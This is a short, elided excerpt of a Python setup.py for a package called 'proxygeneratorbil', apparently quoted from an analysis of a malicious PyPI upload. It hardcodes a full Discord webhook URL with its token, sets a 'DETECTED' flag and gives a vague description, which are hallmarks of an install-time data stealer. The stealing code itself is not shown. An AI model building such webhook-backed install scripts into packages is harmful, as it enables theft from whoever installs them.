...
hook = "https://discord.com/api/webhooks/1050615527661375550/EXOW5XP35BVF_sd8gsNRBG_CzgmG-VeWf3xg8bXCqEYVEsZgEUr67cCFnUFC395ffNnv"
DETECTED = False
...
setup(
    ...
    name='proxygeneratorbil',
    packages=['proxygeneratorbil'],
    version='1.0',
    license='MIT',
    description='makes life easy',
    author='bluesatan',
    keywords=['style'],
    install_requires=[''],
